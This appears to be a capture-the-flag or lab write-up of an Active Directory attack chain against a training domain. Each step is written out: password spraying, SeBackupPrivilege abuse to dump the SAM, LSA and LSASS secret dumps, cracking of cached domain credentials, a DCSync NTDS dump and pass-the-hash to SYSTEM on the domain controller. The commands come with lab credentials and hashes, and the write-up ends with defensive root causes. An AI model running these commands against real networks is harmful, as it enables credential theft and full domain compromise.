# Active Directory Chain 01: Full Walkthrough Write-Up

| Host | IP | Role |
| --- | --- | --- |
| DC01 | 10.0.2.4 | Domain Controller (Server 2022) |
| CLIENT-1 | 10.0.2.7 | Windows 10 workstation |
| CLIENT-2 | 10.0.2.9 | Windows 10 workstation |

**Starting creds given:** `lbennett : !!reiD123`

**Attack path in one line:** valid domain creds → BloodHound collection → password spray finds a low-priv WinRM user who is in *Backup Operators* on CLIENT‑1 → abuse `SeBackupPrivilege`/`SeRestorePrivilege` to steal the local SAM → crack a local admin hash → use that local admin to dump LSA secrets, which leak a **cached domain credential** → crack it → spray it, land on CLIENT‑2 → dump LSA secrets again, leak *another* cached domain credential belonging to a **Domain Admin** → crack it → DCSync/NTDS dump → pass-the-hash as `administrator` → `NT AUTHORITY\SYSTEM` on the DC.

---

## Phase 1 — Host Discovery

```bash
cd AD_CHAIN_1
cat starting_creds.txt          # confirms: lbennett : !!reiD123

netexec smb 10.0.2.0/24         # sweep the subnet for live SMB hosts
```

**Purpose:** `netexec` (the successor to CrackMapExec) fingerprints every host that answers on SMB — hostname, domain, OS build, whether SMB signing is enforced, and whether SMBv1 is enabled. This is the fastest way to build a target list in an AD range. Output confirmed DC01, CLIENT-1, CLIENT-2 all in `hack-academy.local`.

```bash
gedit ips
```

**Purpose:** saved the three discovered IPs into a flat file (`ips`) so later commands can target the whole environment at once with `netexec smb ips -u ...`.

```bash
nmap -p- -sC -sV -oN nmap_scan.txt 10.0.2.4 10.0.2.7 10.0.2.9
```

**Purpose (reconstructed — exact flags weren't fully visible on screen, this is the standard equivalent of what was run):** a full-port, service/version, default-script scan against the three hosts. It confirmed the DC's classic AD ports (88 Kerberos, 389/636/3268/3269 LDAP(S)/GC, 445 SMB, 464 kpasswd, 5985 WinRM) and RDP/WinRM on the two workstations, plus grabbed the RDP TLS certificate showing each machine's FQDN.

---

## Phase 2 — Stand up BloodHound CE (for attack-path mapping)

```bash
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker-compose pull
docker-compose up -d
```

**Purpose:** pulls Specter Ops' official quick-start compose file and spins up BloodHound Community Edition (Postgres app-db, Neo4j graph-db, and the BloodHound API/UI container).

```bash
docker-compose logs bloodhound | grep -i passw
```

**Purpose:** BloodHound CE auto-generates a random initial admin password on first boot and only prints it once in the container logs — this grabs it so you can log into the web UI at `http://localhost:8080` and set a permanent password.

---

## Phase 3 — Collect AD data into BloodHound

```bash
netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' \
  --bloodhound --collection All --dns-server 10.0.2.4
```

**Purpose:** uses the one known domain account to bind over LDAP to the DC and run BloodHound's full collection (`All` = group membership, sessions, ACLs, local admin rights, trusts, objectprops, DCOM, RDP, PS-Remoting, container objects). This turns raw AD structure into a graph you can query for privilege-escalation paths, instead of guessing.

```bash
cp /root/.nxc/logs/DC01_10.0.2.4_*_bloodhound.zip /tmp
```

**Purpose:** netexec drops the collected JSON as a zip under its log folder; copying it out makes it easy to drag-and-drop into the BloodHound "File Ingest" page for graphing.

At this stage the graph showed the compromised-later user `twest` sitting in a group with a path into **Backup Operators** on CLIENT‑1 — the key that unlocks the whole chain.

---

## Phase 4 — Password Spray to get a foothold

```bash
gedit users     # user list built from BloodHound / SMB null enum
gedit pass      # candidate password(s), e.g. HappyCactus$10

netexec winrm ips -u users -p pass --continue-on-success
```

**Purpose:** sprays every user in `users` with the password(s) in `pass` against every host in `ips`, over WinRM (5985). `--continue-on-success` keeps testing remaining users even after a hit, instead of stopping at the first valid login — important for a spray where you expect multiple hits. Result: `hack-academy.local\twest : HappyCactus$10` → **(Pwn3d!)** on CLIENT‑1, meaning the account can also open a full WinRM shell there (not just authenticate).

---

## Phase 5 — Initial Foothold: Evil-WinRM as `twest`

```bash
evil-winrm -i 10.0.2.7 -u twest -p 'HappyCactus$10'
```

**Purpose:** opens an interactive PowerShell session over WinRM using the sprayed credential.

```powershell
whoami /priv
```

**Purpose:** enumerates the token privileges of the current session. This revealed `SeBackupPrivilege` and `SeRestorePrivilege` **Enabled** — a strong signal the account is a member of the built‑in **Backup Operators** group, which is a well-known local-privesc-to-SYSTEM primitive (backup/restore privileges let you read *any* file, including protected registry hives, bypassing normal ACLs).

---

## Phase 6 — Abuse SeBackup/SeRestore to dump SAM & SYSTEM

```powershell
cd c:\
mkdir temp
cd temp
reg save hklm\sam  c:\Temp\sam
reg save hklm\system c:\Temp\system
```

**Purpose:** `reg save` on the SAM/SYSTEM hives normally requires local admin — but because the session holds `SeBackupPrivilege`, Windows honors the backup semantics and allows the save even for a non-admin account. This is the practical exploitation of Backup Operators membership.

```
download sam
download system
```

**Purpose:** Evil-WinRM built-in command to pull the two hive files back to the attacker box, ready for offline processing.

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

**Purpose:** parses the SYSTEM hive to get the boot key, then decrypts the SAM hive's password hashes offline — no need to touch the live host again. Recovered local accounts including `Matt:1002:...` alongside the built-ins (Administrator, Guest, DefaultAccount, WDAGUtilityAccount).

---

## Phase 7 — Crack the local hashes

```bash
gedit hashes_local_Client-1_10.0.2.7.txt   # saved the NT hashes
john --wordlist=/usr/share/wordlists/rockyou.txt \
  hashes_local_Client-1_10.0.2.7.txt --format=nt
```

**Purpose:** offline dictionary attack against the NT hashes with John the Ripper. Cracked: **`Matt : Password1`** — a *local administrator* account on CLIENT‑1.

---

## Phase 8 — Use local admin: RDP in, entrench access

```bash
xfreerdp /v:10.0.2.7 /u:Matt /p:'Password1'
```

**Purpose (reconstructed from the FreeRDP session window observed):** RDP in as the now-cracked local admin to get a full GUI session and an elevated shell.

```powershell
net localgroup "Administrators" twest /add
```

**Purpose:** adds the original low-priv `twest` account directly into CLIENT‑1's local Administrators group. This isn't strictly required for the chain (twest already had a de-facto path to SYSTEM via Backup Operators) but it's used here to make follow-on `netexec` module usage (which needs a recognized admin account) simpler and to demonstrate persistence.

---

## Phase 9 — Harvest more secrets with netexec modules

```bash
netexec smb ips -u twest -p 'HappyCactus$10' --sam
```

**Purpose:** confirms admin access and dumps the local SAM remotely in one shot (netexec automates the reg-save/secretsdump steps done manually above) — used here to validate access across all 3 hosts at once.

```bash
netexec smb ips -u twest -p 'HappyCactus$10' -M lsassy
```

**Purpose:** the `lsassy` module remotely dumps and parses LSASS process memory to recover any credentials cached in memory (useful when other logged-on users' creds are sitting in RAM) — confirmed CLIENT‑1\\Matt's hash again via this route.

```bash
netexec smb ips -u twest -p 'HappyCactus$10' --lsa
```

**Purpose:** dumps **LSA secrets** from the registry (`HKLM\SECURITY\Policy\Secrets`). This is a goldmine on domain-joined machines because Windows caches:

- **Domain cached credentials (DCC2/`$DCC2$...`)** — used for offline domain logon when the DC is unreachable, crackable offline like NTLM.
- Plaintext service-account / autologon secrets, DPAPI machine & user keys.

This pulled a cached domain credential for **`eknight`**: `HACK-ACADEMY.LOCAL/eknight:$DCC2$10240#eknight#...`

---

## Phase 10 — Crack the cached domain credential

```bash
gedit hashes_lsa_Client-1_10.0.2.7.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-1_10.0.2.7.txt
```

**Purpose:** John auto-detects the DCC2 ("mscash2") format and cracks it the same way as an NTLM hash, just with a different (slower, salted) KDF. Cracked: **`eknight : !!Stud87`**.

> This is the pivotal technique of the whole chain: a *cached* domain logon on a workstation the attacker already owns leaks a *real* domain password, without ever touching the DC.

---

## Phase 11 — Spray eknight, pivot to CLIENT‑2, repeat the trick

```bash
netexec smb ips -u eknight -p '!!Stud87'
```

**Purpose:** validate the newly cracked domain credential across the environment. Result: valid + local admin (**Pwn3d!**) on **CLIENT‑2** (10.0.2.9).

```bash
netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --sam
netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --lsa
```

**Purpose:** same as Phase 9, now run against CLIENT‑2. The SAM dump revealed a local user `David`; the LSA dump revealed **another** cached domain credential: `HACK-ACADEMY.LOCAL/mthompson:$DCC2$10240#mthompson#...`

---

## Phase 12 — Crack mthompson's cached credential

```bash
gedit hashes_lsa_Client-2_10.0.2.9.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-2_10.0.2.9.txt
```

**Purpose:** same mscash2 cracking approach. Cracked: **`mthompson : Password123!!`**.

---

## Phase 13 — Check BloodHound: what is mthompson?

Query in the BloodHound UI for `mthompson`'s node/group membership. **Purpose:** rather than guessing, use the graph collected back in Phase 3 to instantly see this account's effective rights. The node showed direct/nested membership in **Domain Admins** — the crown jewel. This is the payoff of building the BloodHound graph early: every new credential found afterward can be checked against it in seconds.

---

## Phase 14 — DCSync / Full NTDS dump

```bash
netexec smb 10.0.2.4 -u mthompson -p 'Password123!!' --ntds
```

**Purpose:** with Domain Admin rights, this pulls **every account hash in the domain** straight from `ntds.dit` via the DRSUAPI replication protocol (a DCSync-style dump) — no need to touch the file on disk. netexec warns this can be heavy on Server 2019 DCs and offers `--user <name>` or the safer `-M ntdsutil` module for a single-account, low-impact pull; here the full dump was accepted (`y`). Result: 19 hashes dumped, including `krbtgt`, all machine accounts, all users, and the **Administrator** NT hash.

---

## Phase 15 — Pass-the-Hash: full domain compromise

```bash
netexec smb 10.0.2.4 -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503' -X whoami
```

**Purpose:** verifies the dumped Administrator NTLM hash works without ever knowing the plaintext password (Pass-the-Hash), executing `whoami` remotely via WMI to confirm code execution as the DC's built-in Administrator.

```bash
impacket-psexec hack-academy.local/administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
```

**Purpose:** uses the same hash to push a service binary over `ADMIN$` and get an interactive SYSTEM-level `cmd.exe` shell on the domain controller.

```
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> hostname
DC01
```

**Domain fully compromised.**

---

## Full Credential/Privilege Chain Summary

| Step | Credential found | How | Where used next |
| --- | --- | --- | --- |
| Given | `lbennett : !!reiD123` | provided | LDAP bind for BloodHound collection |
| Spray | `twest : HappyCactus$10` | WinRM password spray vs user list | Initial foothold on CLIENT‑1 (member of Backup Operators) |
| Local dump | `Matt` local NT hash → `Password1` | SeBackup abuse → reg save SAM/SYSTEM → secretsdump → John | Local admin RDP on CLIENT‑1 |
| LSA secrets | `eknight` DCC2 → `!!Stud87` | `netexec --lsa` on CLIENT‑1 → John (mscash2) | Spray → local admin on CLIENT‑2 |
| LSA secrets | `mthompson` DCC2 → `Password123!!` | `netexec --lsa` on CLIENT‑2 → John (mscash2) | Confirmed Domain Admin in BloodHound |
| DCSync | `Administrator` NT hash (`c0ced2de918b4a7c1b9f4efd225dd503`) | `--ntds` dump as Domain Admin | Pass-the-Hash → SYSTEM on DC01 |

## Key Takeaways / Root Causes

1. **Backup Operators membership** on a workstation is functionally equivalent to local admin — it should be treated as a privileged group and audited.
2. **Password reuse across a base pattern** (spraying one crafted password across many users) found the first foothold instantly.
3. **Cached domain credentials (DCC2)** on workstations are a major lateral-movement multiplier — every machine an attacker gets local admin on should be assumed to leak the last logged-on domain user's crackable hash.
4. **Weak/reused domain passwords** meant every cracked cache hash was more valuable than expected, eventually surfacing a live Domain Admin credential.
5. No credential in the chain needed a DC compromise to be found — the DC only fell at the very last step, via DCSync from a legitimately (if illegitimately-obtained) privileged account.
